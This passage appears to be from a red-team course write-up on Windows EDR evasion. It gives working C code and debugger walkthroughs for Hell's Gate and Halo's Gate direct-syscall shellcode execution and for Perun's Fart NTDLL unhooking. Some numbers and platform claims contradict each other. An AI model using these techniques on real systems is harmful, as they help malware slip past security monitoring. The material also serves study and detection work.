        pVxEntry->wSystemCall = *(PWORD)(pFunctionBytes + idx + 4);
        break;
    }
}
```

When this specific byte signature is found, the two bytes representing the system call number are extracted and stored in the `wSystemCall` element of our structure.

This process is repeated for all four functions. Once the `VX_TABLE` is fully populated, we call the payload function.

### How the Payload Executes

The payload function uses the two assembly functions, `HellsGate` and `HellDescent`, in the following pattern:

1.  To call `NtAllocateVirtualMemory`, we first call `HellsGate` with the system call number as a parameter. This stores the number in a global variable.
2.  Then, we call `HellDescent` with the exact same parameters that the real `NtAllocateVirtualMemory` function takes. Internally, `HellDescent` retrieves the system call number from the global variable and executes the `syscall` instruction.

This two-step combo is used for all subsequent operations:
*   We allocate virtual memory (`NtAllocateVirtualMemory`).
*   We decrypt our payload (the familiar message box shellcode).
*   We copy the decrypted payload, byte by byte, into the newly allocated memory region.
*   We change the memory permissions from `PAGE_READWRITE` to `PAGE_EXECUTE_READ` using `NtProtectVirtualMemory`.
*   Finally, we create a new thread with `NtCreateThreadEx` that runs our payload and use `NtWaitForSingleObject` to wait for it to finish.

It's important to note that this example runs the shellcode within its own process, but the same technique can be used for injection into another process.

## Complete Payload Execution Flow

```c
// Allocate memory for payload
HellsGate(vxTable.NtAllocateVirtualMemory.wSystemCall);
HellDescent(NtCurrentProcess(), &lpAddress, 0, &dwSize, 
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Copy decrypted payload
memcpy(lpAddress, decryptedPayload, payloadSize);

// Change memory protection to executable
HellsGate(vxTable.NtProtectVirtualMemory.wSystemCall);
HellDescent(NtCurrentProcess(), &lpAddress, &dwSize, 
            PAGE_EXECUTE_READ, &dwOldProtect);

// Execute payload in new thread
HellsGate(vxTable.NtCreateThreadEx.wSystemCall);
HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, 
            NtCurrentProcess(), lpAddress, NULL, 0, 0, 0, 0, NULL);

// Wait for thread completion
HellsGate(vxTable.NtWaitForSingleObject.wSystemCall);
HellDescent(hThread, FALSE, NULL);
```

## Debugger Analysis

### Setting Up the Debug Environment

The code includes a debug breakpoint for analysis:
```cpp
// Debug breakpoint - remove for production
__debugbreak();
```

<img width="1608" height="717" alt="image" src="https://github.com/user-attachments/assets/7d3caf64-ee65-4a27-8ac6-bcb28c435808" />

### Step-by-Step Debugging

#### 1. Compile and Run

After compiling and running the program under a debugger, it hits the breakpoint. We can then step through the code to observe the `VX_TABLE` being populated.

```batch
cd 03.HellsGate

# building Hell's Gate:
msbuild HellsGate.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
```
<img width="1246" height="607" alt="image" src="https://github.com/user-attachments/assets/8f1386b5-5a74-4cec-9ee1-b761618e4b2e" />
<img width="1233" height="611" alt="image" src="https://github.com/user-attachments/assets/225c88aa-af11-45fb-b61c-3d45a220efa2" />

 <img width="375" height="231" alt="image" src="https://github.com/user-attachments/assets/5e4be979-261d-4583-8769-a4e9ee071f82" />

#### 2. Debugger Analysis of Hash Resolution

For demonstration, an `int 3` instruction (a hard-coded breakpoint) was added to the code. This requires running the program under a debugger.

<img width="1608" height="795" alt="image" src="https://github.com/user-attachments/assets/d4f101be-573b-4189-8d88-f454c9bbd11a" />

<img width="1611" height="800" alt="image" src="https://github.com/user-attachments/assets/a7e84705-4412-4cdd-8929-a8338e1eda4c" />

<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/1d45ccce-2cc7-4674-8ae3-71ea43e0613e" />

*   Stepping through the `get_vx_table_entry` function for `NtAllocateVirtualMemory`, we see it successfully finds the function address and its system call number, which is `0x18`. This can be verified in the debugger's symbol view for `ntdll.dll`.
*   This process repeats for `NtCreateThreadEx`, whose system call number is found to be `0xbc`. By following its address in the disassembler, we confirm it points to the correct function.
*   Once all four structures are filled, the `VX_TABLE` at its memory address contains all the resolved addresses and numbers.

---

Before we proceed, we need to remove the hardcoded `int 3` breakpoint instruction. To do this, we use the debugger's "Assemble" feature to overwrite the `int 3` opcode with a `NOP` (No Operation) instruction, which has no effect.

<img width="1611" height="803" alt="image" src="https://github.com/user-attachments/assets/db10957d-dab2-46f0-b9f0-3c1edb13fb6e" />
<img width="1607" height="797" alt="image" src="https://github.com/user-attachments/assets/916e18d0-c547-4eea-b85a-1905be41f6e6" />

When the debug breakpoint hits, observe:
- **RAX register** contains the hash value for the target function
- **RCX register** holds ntdll base address
- **RDX register** contains export directory pointer
- **R8 register** points to the VX_TABLE_ENTRY structure

Now, with the `RAX` register holding our target function hash, we see that the `R8` register holds a memory address. 

<img width="1613" height="460" alt="image" src="https://github.com/user-attachments/assets/910ebbec-5c4a-49dd-a988-6f81e3896cf5" />

Let's examine what's at that address in the memory dump.

<img width="1603" height="545" alt="image" src="https://github.com/user-attachments/assets/26d32634-2323-43ed-903e-edf59f35931e" />

As you can see, it already contains our hash value. Since `R8` is the third parameter for this function call, this address is a pointer to the `VX_TABLE_ENTRY` structure for `NtAllocateVirtualMemory`.

<img width="1610" height="345" alt="image" src="https://github.com/user-attachments/assets/4a97aee9-60b9-481b-a6de-5fae43989234" />

#### 3. Verifying Syscall Resolution

After resolution, check the VX_TABLE_ENTRY structure:
- **pAddress** field contains the function address in ntdll
- **dwHash** field shows the precomputed hash
- **wSystemCall** field contains the dynamically resolved syscall number
 
<img width="1617" height="357" alt="image" src="https://github.com/user-attachments/assets/4314ece1-5df4-4feb-8bc7-40441eb73c6e" />

---

Example verification in debugger:
```assembly
; Check NtAllocateVirtualMemory resolution
ntdll!NtAllocateVirtualMemory: 0x00007FFC04A31250
Resolved Syscall: 0x0018
```
We will now step over the `get_vx_table_entry` function. Upon return, we can see the structure has been populated: an address is stored in the first element, and the system call number `0x18` is in the third.

Let's verify this is correct. We can go to the symbols view for `ntdll.dll` and find `NtAllocateVirtualMemory`. Its system call number is indeed `0x18`, confirming our function worked and the first structure is filled.

<img width="1681" height="813" alt="image" src="https://github.com/user-attachments/assets/325fa90c-b9e3-4019-9508-eaf42082ee6d" />
<img width="1684" height="817" alt="image" src="https://github.com/user-attachments/assets/ad09c2c9-9ee4-4779-89d2-0e349fa137a3" />
<img width="1679" height="808" alt="image" src="https://github.com/user-attachments/assets/794822c3-2535-4086-ba4c-920e1cfa0fe6" />
<img width="1679" height="809" alt="image" src="https://github.com/user-attachments/assets/3f6d5c3b-22dc-4844-b919-63baf9d72512" />


We then repeat this process for the next function, `NtCreateThreadEx`. Stepping over its population call, we see its system call number, `0xbc`, is stored. 

<img width="1685" height="820" alt="image" src="https://github.com/user-attachments/assets/fc7c64ca-882f-4b04-94c8-7716265ce6af" />

Instead of checking the symbols again, we can take the function address that was found and follow it in the disassembler.

<img width="1682" height="817" alt="image" src="https://github.com/user-attachments/assets/a615a538-fa5b-4a9e-92c1-b028d572ed82" />

This confirms it points to the correct `NtCreateThreadEx` function which is `B8 BC 000000`, proving the technique is working and the table is being filled correctly.
 
<img width="1684" height="824" alt="image" src="https://github.com/user-attachments/assets/2e22fba6-45b5-47e0-a6d2-67331de6b998" />


We let the program run to complete the population for all four structures. 

<img width="578" height="82" alt="image" src="https://github.com/user-attachments/assets/5b11d6f4-f778-4175-af71-ed93f293d8f1" />
<img width="581" height="117" alt="image" src="https://github.com/user-attachments/assets/c5d72050-314e-49bd-97bc-1810fe18f6f9" />
 <img width="580" height="120" alt="image" src="https://github.com/user-attachments/assets/939c1be3-7056-458e-8f84-85121a5128a7" />
<img width="576" height="119" alt="image" src="https://github.com/user-attachments/assets/e0eba020-4e22-4840-bfd9-b5df8ca9f4cd" />

We can then inspect the final `VX_TABLE` at its memory address (`0xf99...`) to see all the resolved addresses and system call numbers.

<img width="1444" height="644" alt="image" src="https://github.com/user-attachments/assets/c41034ba-631e-49a1-a426-5556870828c2" />
<img width="1672" height="467" alt="image" src="https://github.com/user-attachments/assets/6e935185-14b2-4632-9fb7-8210bd79744b" />
<img width="1678" height="731" alt="image" src="https://github.com/user-attachments/assets/a79e3e47-6616-4915-bfae-15ab2692e091" />

### Stepping Through the Payload Execution

The execution now proceeds to the payload function. We set a breakpoint at its entry and step into it and hit enter on the cmd.

<img width="1685" height="809" alt="image" src="https://github.com/user-attachments/assets/c6c0cca9-99cb-4ff9-ad7e-a73d2f28119c" />
<img width="1679" height="555" alt="image" src="https://github.com/user-attachments/assets/fb517c1f-5974-4df0-9f04-89935391595b" />

The first operation is a `LoadLibrary` call, which is only necessary for our specific message box payload. The shellcode itself doesn't load this library, so we must ensure it's present in the process beforehand.

<img width="1609" height="810" alt="image" src="https://github.com/user-attachments/assets/df665e0b-8342-47a1-bfe5-232276801d92" />

After some diagnostic `printf` calls, we reach the core of the technique. We see the two values that correspond to our `HellsGate` and `HellDescent` functions. Let's examine the first call to `NtAllocateVirtualMemory`.

<img width="1609" height="818" alt="image" src="https://github.com/user-attachments/assets/0f2b6d0c-0601-4ae0-9eed-89ab52812161" />
<img width="1605" height="803" alt="image" src="https://github.com/user-attachments/assets/561c854e-d916-4feb-9516-dd6209e89180" />
<img width="1611" height="683" alt="image" src="https://github.com/user-attachments/assets/cd0f3b36-8296-4d90-b63e-5cca102f2735" />

1.  **Calling `HellsGate`:** The `HellsGate` function is called with a single parameter. We see the value `0x18` (the system call number for `NtAllocateVirtualMemory`) moved into the `ECX` register. Stepping into `HellsGate` shows this value being copied into the global variable.

<img width="1609" height="800" alt="image" src="https://github.com/user-attachments/assets/4d15bdda-030b-40ee-946c-4711901edbf7" />

This is from this code `hellsgate.asm`:

<img width="1611" height="800" alt="image" src="https://github.com/user-attachments/assets/6826fc96-b01f-4d44-8959-b566d794cd61" />

3.  **Calling `HellDescent`:** Immediately after, `HellDescent` is called. It is passed the same parameters that the real `NtAllocateVirtualMemory` function expects. Note that the second parameter (`RDX`) is a pointer to a variable that will receive the address of the newly allocated memory.

<img width="1612" height="794" alt="image" src="https://github.com/user-attachments/assets/35c5b830-cb3f-40fa-8a81-0d28624f95ff" />

Hit `enter`:

<img width="1613" height="807" alt="image" src="https://github.com/user-attachments/assets/ae00761c-6ce2-4ac8-b1ae-658c0acb7345" />

Stepping into `HellDescent`, we observe it retrieving the system call number `0x18` from the global variable, moving it into `EAX`, and executing the `syscall` instruction.

<img width="1609" height="793" alt="image" src="https://github.com/user-attachments/assets/95ba664c-c173-47e2-adcf-93872fd05ab4" />

After the system call returns and we step over, we can see that the memory address variable (pointed to by `RDX`) has been populated with a valid address. 

We can verify this successful allocation by checking the process memory in a tool like Process Hacker, where a new, private commit memory page will be visible at this address. This confirms the entire HellsGate technique has executed successfully.

<img width="1615" height="799" alt="image" src="https://github.com/user-attachments/assets/6ce52d97-1b49-4f01-a846-e6888ee9ea5b" />

<img width="1610" height="791" alt="image" src="https://github.com/user-attachments/assets/eac184d6-100d-484e-b608-f10b3cf9fbd8" />

<img width="1610" height="788" alt="image" src="https://github.com/user-attachments/assets/9ae57efd-9795-44fe-8ba0-6d62873217e4" />

<img width="1607" height="313" alt="image" src="https://github.com/user-attachments/assets/bbb5ca31-fe6d-4ad8-abe1-9ddc3b089899" />

Currently empty:

<img width="1613" height="339" alt="image" src="https://github.com/user-attachments/assets/e1377775-d637-44b0-8d7b-913acc4fc93e" />

But after a while, we should see this memory being filled with decrypted payload:

<img width="1612" height="800" alt="image" src="https://github.com/user-attachments/assets/d32386c3-5a90-4809-aa0e-0694c81f5c10" />

<img width="1612" height="792" alt="image" src="https://github.com/user-attachments/assets/260fe6a8-ab41-4e19-bf92-0e4b3ee8385b" />

If we hit `enter` our shellcode gets executed:

<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/8e6b9159-d480-4bbe-b815-2bfa530e266f" />

## Limitations and Detection Vectors

### The Hook Problem

Hells Gate works very well but has one significant limitation: it cannot resolve syscalls from hooked NTDLL functions. When AV/EDR solutions hook functions, they replace the beginning of the function with a jump to their detection code:

```
Original Syscall Stub:
4C 8B D1          ; MOV R10, RCX
B8 18 00 00 00    ; MOV EAX, 0x18
0F 05             ; SYSCALL

Hooked Function:
E9 XX XX XX XX    ; JMP to AV detection code
90 90 90 90 90    ; NOP padding
```

When HellsGate tries to scan for the syscall stub pattern in a hooked function, it fails because the characteristic bytes (`4C 8B D1 B8`) are replaced by the detour jump. The resolution function will reach its maximum search distance and return false, causing the program to exit.

### Testing Against Hooked NTDLL

To demonstrate this limitation:
1. Copy the compiled executable to a directory monitored by security software
2. Remove the debug breakpoint and recompile
3. Run the executable from the monitored location
4. Observe that the program fails to execute

The HellsGate technique successfully resolves functions but fails when it encounters hooks because it cannot find the syscall stub pattern in the modified function prologues.

## Advanced Detection Considerations

Modern EDR solutions may detect HellsGate through:
- **Behavioral analysis**: Unusual sequence of direct syscall usage
- **Memory scanning**: Detection of the characteristic hash values or resolution patterns
- **Timing analysis**: The resolution process involves significant parsing that could be timed
- **Export table monitoring**: Suspicious access patterns to NTDLL's export directory

## Conclusion

Hells Gate demonstrates an effective technique for dynamic syscall resolution that:
- Eliminates version dependency by resolving syscall numbers at runtime
- Bypasses user-mode API hooks by making direct system calls
- Uses minimal dependencies (only NTDLL)
- Provides a clean interface for syscall invocation

However, its limitation against hooked NTDLL functions led to the development of more advanced techniques like Halo's Gate, which can resolve syscalls even from hooked functions by examining alternative memory regions and using fallback strategies.

The technique remains valuable for educational purposes and demonstrates important concepts in Windows internals, PE parsing, and direct system call implementation.

</details>



<details>
<summary>05 - Hooks vs Halo Gate</summary>

## Overview

Halo's Gate is an enhancement to the Hell's Gate technique that enables dynamic syscall resolution even when NTDLL functions are hooked by AV/EDR solutions. This method bypasses API hooks without requiring a fresh copy of NTDLL from disk by leveraging the linear and ordered nature of syscall numbers in memory.

## The Problem: Hooks vs Hell's Gate

While Hell's Gate works effectively against unhooked NTDLL, it fails when security solutions hook functions because the characteristic syscall stub pattern (`4C 8B D1 B8`) is replaced with detour jumps. Halo's Gate addresses this limitation by exploiting the observation that not all syscalls are hooked and their numbers follow a predictable, linear order in memory.

## Core Concept: Linear Syscall Ordering

### The Key Insight

System calls in NTDLL are arranged in linear, sequential order in memory. When a specific syscall is hooked, we can examine its neighbors to find clean (unhooked) syscalls and mathematically derive the original syscall number.

## Practical Demonstration

[01.Unhooks/04.HalosGate](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/04.HalosGate)

### Step 1: Analyzing Hooked NTDLL in Notepad

Let's start by examining a real-world scenario with hooked NTDLL:

1. **Open Notepad** and attach a debugger to it
2. **Examine NtCreateThreadEx** in NTDLL - we can see it's hooked
   
   <img width="1680" height="809" alt="image" src="https://github.com/user-attachments/assets/0b68afb4-890b-4dba-b207-f3f66106dd71" />
   <img width="1686" height="810" alt="image" src="https://github.com/user-attachments/assets/1323e12b-9a88-4d65-a758-ffe71d3bd062" />


3. **Navigate through memory** to observe the pattern

**Debugger Observation:**
```
NtCreateThreadEx:      HOOKED (starts with E9 jump)
+32 bytes:             Another hooked syscall (NtCreateProcessEx)  
+64 bytes:             NtIsProcessInJob - CLEAN, syscall number = 0x4F
```
   <img width="1683" height="835" alt="image" src="https://github.com/user-attachments/assets/778e3ca6-aa89-43fc-a66b-ef3d73c9c438" />
   <img width="1680" height="823" alt="image" src="https://github.com/user-attachments/assets/a299808f-2c41-49fa-90b0-61281eab6b4b" />
<img width="1681" height="814" alt="image" src="https://github.com/user-attachments/assets/87cd28ed-eef4-4251-9901-ac78c857ff44" />


### Step 2: Understanding the Linear Pattern

The syscalls follow a predictable sequential pattern:

```
NtCreateThreadEx (hooked)    - should be 0x4E
NtCreateProcessEx (hooked)   - should be 0x4D  
NtIsProcessInJob (clean)     - actual 0x4F
NtProtectVirtualMemory       - actual 0x50
```

<img width="1610" height="441" alt="image" src="https://github.com/user-attachments/assets/039a9fa0-1083-48ab-b246-d6c60a309a55" />
<img width="1611" height="462" alt="image" src="https://github.com/user-attachments/assets/49ce93af-906f-4180-8611-2bc6abd53ec2" />


If we know that `NtIsProcessInJob` at +64 bytes has syscall number `0x4F`, and our target `NtCreateThreadEx` is 2 positions away, we can calculate:
- `NtCreateThreadEx` syscall = `0x4F - 2 = 0x4D`

### Step 3: The Mathematical Foundation

The technique relies on two critical facts:
1. **Linear Ordering**: Syscall numbers increase sequentially in memory
2. **Fixed Stub Size**: Each syscall stub occupies exactly 32 bytes on 64-bit Windows 10

## Implementation Architecture

 <img width="369" height="345" alt="image" src="https://github.com/user-attachments/assets/f76d5bfe-23f0-461f-93b6-79323a246cf6" />

### Modified Resolution Algorithm

HalosGate `main.c` modifies the `GetVxTableEntry` function from Hell's Gate with a sophisticated neighbor-search algorithm.

<img width="1606" height="803" alt="image" src="https://github.com/user-attachments/assets/8d096ded-297a-40c6-b5dc-609321c55641" />


### Core Search Logic

```c
// First opcodes should be :
//    MOV R10, RCX
//    MOV RAX, <syscall>
if (*((PBYTE)pFunctionAddress) == 0x4c
    && *((PBYTE)pFunctionAddress + 1) == 0x8b
    && *((PBYTE)pFunctionAddress + 2) == 0xd1
    && *((PBYTE)pFunctionAddress + 3) == 0xb8
    && *((PBYTE)pFunctionAddress + 6) == 0x00
    && *((PBYTE)pFunctionAddress + 7) == 0x00) {

    BYTE high = *((PBYTE)pFunctionAddress + 5);
    BYTE low = *((PBYTE)pFunctionAddress + 4);
    pVxTableEntry->wSystemCall = (high << 8) | low;
    
    return TRUE;
}
```

When a function is found to be hooked (starts with `0xE9` jump instruction), the algorithm:

1. **Starts with nearest neighbors** (+32 bytes and -32 bytes)
   ```batch
   # Down and up are defined here:
   ```
   
   <img width="1611" height="194" alt="image" src="https://github.com/user-attachments/assets/34ca195b-a112-4c5a-9623-9633de9579f6" />

	32 means that the whole sys call stub is 32 bytes, this is true for 64 bit windows 10. For 32 bit, these stubs are 16 bytes.
   
   <img width="1610" height="609" alt="image" src="https://github.com/user-attachments/assets/4f231a5f-c636-4204-866e-7be388b55a32" />

   This implementation works only on 32 bit windows 10. 
 
3. **Expands search radius** incrementally if neighbors are also hooked
4. **Calculates target syscall** once a clean neighbor is found

## Step-by-Step Technical Process

### Step 1: Initial Function Resolution

The process begins identically to Hell's Gate:

1. **Locate NTDLL** via Process Environment Block (PEB)
2. **Parse Export Directory** to find target function addresses
3. **Hash Function Names** using DJB2 algorithm
4. **Extract Function Addresses** from export table

### Step 2: Hook Detection

When examining the target function:

```c
if (first_byte == 0xe9) {  // HOOK DETECTED!
    // Then search neighborhood for clean syscall
    for (idx = 1; idx <= 500; idx++) {
        // Search UP and DOWN for the clean syscall pattern
    }
}
```

### Step 3: Spiral Neighbor Search

When a hook is detected, the algorithm searches neighbors in expanding distances:

**Search Pattern:**
```
Distance 1: Target + 32 bytes, Target - 32 bytes
Distance 2: Target + 64 bytes, Target - 64 bytes  
Distance 3: Target + 96 bytes, Target - 96 bytes
... up to maximum search distance (typically 10)
```

<img width="1610" height="801" alt="image" src="https://github.com/user-attachments/assets/6fed8421-ab71-47ff-b42a-4efd5a13c3ec" />

```c
for (WORD idx = 1; idx <= 500; idx++) {
    // check neighboring syscall DOWN (idx * DOWN = -32 * idx)
    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
        // ... pattern check ...
    
    // check neighboring syscall UP (idx * UP = +32 * idx)  
    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
        // ... pattern check ...
}
```

### Step 4: Syscall Number Calculation

Once a clean neighbor is found:

- **For downward search**: `target_syscall = neighbor_syscall - distance`
- **For upward search**: `target_syscall = neighbor_syscall + distance`

## Code Implementation

### Modified GetVxTableEntry Function

```c
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            // CORE SEARCH: Check for clean syscall at target address
            if (*((PBYTE)pFunctionAddress) == 0x4c
                && *((PBYTE)pFunctionAddress + 1) == 0x8b
                && *((PBYTE)pFunctionAddress + 2) == 0xd1
                && *((PBYTE)pFunctionAddress + 3) == 0xb8
                && *((PBYTE)pFunctionAddress + 6) == 0x00
                && *((PBYTE)pFunctionAddress + 7) == 0x00) {
                // Extract syscall number
                return TRUE;
            }

            // MODIFICATION: Neighbor search for hooked functions
            if (*((PBYTE)pFunctionAddress) == 0xe9) {
                for (WORD idx = 1; idx <= 500; idx++) {
                    // Search DOWN
                    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
                        // ... pattern check ...
                    
                    // Search UP  
                    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
                        // ... pattern check ...
                }
                return FALSE;
            }
        }
    }
    return TRUE;
}
```

### Neighbor Search Implementation

```c
// if hooked check the neighborhood to find clean syscall
if (*((PBYTE)pFunctionAddress) == 0xe9) {

    for (WORD idx = 1; idx <= 500; idx++) {
        // check neighboring syscall down
        if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
            && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
            && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
            && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
            && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
            && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
            BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
            BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
            pVxTableEntry->wSystemCall = (high << 8) | low - idx;
            
            return TRUE;
        }
        // check neighboring syscall up
        if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
            && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
            && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
            && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
            && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
            && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
            BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
            BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
            pVxTableEntry->wSystemCall = (high << 8) | low + idx;
            
            return TRUE;
        }
    }
    
    return FALSE;
}
```

## Practical Testing

### Step 1: Compile and Test

```batch
cd ..\04.HalosGate
msbuild HellsGate.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
```

<img width="1610" height="801" alt="image" src="https://github.com/user-attachments/assets/650d82c9-e61b-4e5a-98e9-25de48d8a835" />
<img width="1608" height="799" alt="image" src="https://github.com/user-attachments/assets/e94c41f0-4365-4535-9133-b98de3d276b8" />


### Step 2: Verify Hooks Exist

1. **Run the compiled executable**
   <img width="377" height="221" alt="image" src="https://github.com/user-attachments/assets/8b470eea-300c-4a99-9ee8-61bb8f9798db" />
   
2. **Copy to test environment folder and rename it as halo.exe**
   <img width="380" height="173" alt="image" src="https://github.com/user-attachments/assets/155fb672-0cd6-4ca3-88a7-580f23c1efcf" />

3. **Observe successful execution** despite hooks
   <img width="1293" height="704" alt="image" src="https://github.com/user-attachments/assets/dd66499c-1624-4ee2-a410-2287f29e78da" />

4. **Confirm in debugger** that NtCreateThreadEx is still hooked
   - Run halo.exe again and Attach on the debugger this time
     <img width="1609" height="797" alt="image" src="https://github.com/user-attachments/assets/b760770a-a991-4f5f-8e3b-0091019cd4e7" />
	 <img width="1611" height="772" alt="image" src="https://github.com/user-attachments/assets/7f462ba4-216d-4b86-ad2e-b49ba98d8991" />
	 <img width="1683" height="523" alt="image" src="https://github.com/user-attachments/assets/56339926-c51b-4aaf-8af4-e729584deffd" />

### Step 3: Debugger Verification

1. **Attach debugger to running process**
2. **Examine NtCreateThreadEx** - confirm it starts with `E9` (hook)
3. **Check neighboring functions** - observe clean syscalls at +32, +64 bytes
4. **Verify calculated syscall numbers** match expected values

   - We run it:
     <img width="1681" height="807" alt="image" src="https://github.com/user-attachments/assets/31ab49cd-4111-436b-b22e-c35b10f1d0e6" />

   - Check if hook is still there: Right click on hook -> Analysis -> Analyze module:
     <img width="1681" height="816" alt="image" src="https://github.com/user-attachments/assets/bdb870e4-3fef-4105-b5e9-bde522b7b2ad" />
	 <img width="1684" height="823" alt="image" src="https://github.com/user-attachments/assets/400dea0f-8a9e-4fc5-9c4a-83824f8a430c" />

   - Run it, and it works as intended:
     <img width="1684" height="820" alt="image" src="https://github.com/user-attachments/assets/f2a2668e-8d6b-4668-8ce0-72219892a242" />


## Technical Considerations

### Platform Specifics

**Stub Sizes:**
- 64-bit Windows 10: 32 bytes per syscall stub
- 32-bit Windows: 16 bytes per syscall stub

**Search Parameters:**
- `MAX_SEARCH_DISTANCE = 10` balances reliability and performance
- Must be adjusted for different Windows versions

### Limitations

1. **Massive Hook Deployment**: If all nearby syscalls are hooked, resolution fails
2. **Non-linear Syscall Layout**: Theoretical edge case if syscalls aren't sequential
3. **Stub Size Variations**: Different Windows versions may have different stub sizes

## Comparison with Hell's Gate

| Aspect | Hell's Gate | Halo's Gate |
|--------|-------------|-------------|
| Hook Bypass | No | Yes |
| Resolution Method | Direct pattern scan | Neighbor inference |
| Compatibility | Unhooked NTDLL only | Hooked & unhooked NTDLL |
| Complexity | Simple | Moderate |

## Conclusion

Halo's Gate represents a significant evolution in syscall resolution techniques by addressing the primary limitation of Hell's Gate. By leveraging the linear ordering of syscalls in memory, it can infer correct syscall numbers even when target functions are hooked, maintaining the benefits of direct syscall invocation while expanding compatibility to hooked environments.

The technique demonstrates that even when security products hook critical functions, the structural relationships between syscalls in memory provide enough information to recover the necessary data for direct system call invocation.

</details>



<details>
<summary>06 - Process Unhooking Peruns Fart</summary>

## Overview

Perun's Fart (also known as Parent SVART) is an advanced technique for unhooking NTDLL without reading a fresh copy from disk, which some EDR solutions may flag as suspicious behavior. Instead, it leverages the natural process creation sequence to access a clean version of NTDLL from a suspended process.

## Core Concept: Exploiting Process Creation Timing

[01.Unhooks/05.PerunsFart](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/05.PerunsFart)

### The Race Condition Advantage

During normal process creation, there's a critical timing window:
1. Windows loads NTDLL into the new process
2. There's a slight delay before AV/EDR solutions inject their monitoring DLLs
3. By creating processes in suspended mode, we can access clean NTDLL before hooks are installed

### The Suspended Process Strategy

```c
// Creating Suspended Process
BOOL success = CreateProcessA(
    NULL, 
    (LPSTR)"cmd.exe", 
    NULL, NULL, FALSE, 
    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // <-- STEP 1
    NULL, "C:\\Windows\\System32\\", &si, &pi);

// Extracting Clean NTDLL from Suspended Process
SIZE_T bytesRead = 0;
if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
    printf("Error reading: %d | %x\n", bytesRead, GetLastError());  // <-- STEP 2

// Terminate Suspended Process
printf("Kill?"); getchar();
TerminateProcess(pi.hProcess, 0);  // <-- STEP 3

// Unhooking Current Process with Clean NTDLL
printf("Unhooking ntdll\n");
ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);  // <-- STEP 4


```

## Step-by-Step Implementation

### Step 1: Create Suspended Process

The technique begins by spawning a temporary process in suspended mode:

```c
BOOL success = CreateProcessA(
    NULL, 
    (LPSTR)"cmd.exe", 
    NULL, 
    NULL, 
    FALSE, 
    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // <-- THIS FLAG CREATES SUSPENDED PROCESS
    NULL, 
    "C:\\Windows\\System32\\", 
    &si, 
    &pi);
```

**Why this works:** The `CREATE_SUSPENDED` flag blocks the process from executing, which also prevents security products from injecting their monitoring DLLs until the process is resumed.

### Step 2: Extract Clean NTDLL from Suspended Process

Once we have the suspended process, we extract its clean NTDLL:

```c
// Get ntdll address and size from current process:
char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

// Allocate buffer for the clean copy:
LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

// Extract clean ntdll from SUSPENDED process:
SIZE_T bytesRead = 0;
if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
    printf("Error reading: %d | %x\n", bytesRead, GetLastError());
```

### Step 3: Terminate Suspended Process

After extracting the clean NTDLL, we no longer need the suspended process:
```c
TerminateProcess(pi.hProcess, 0);
```

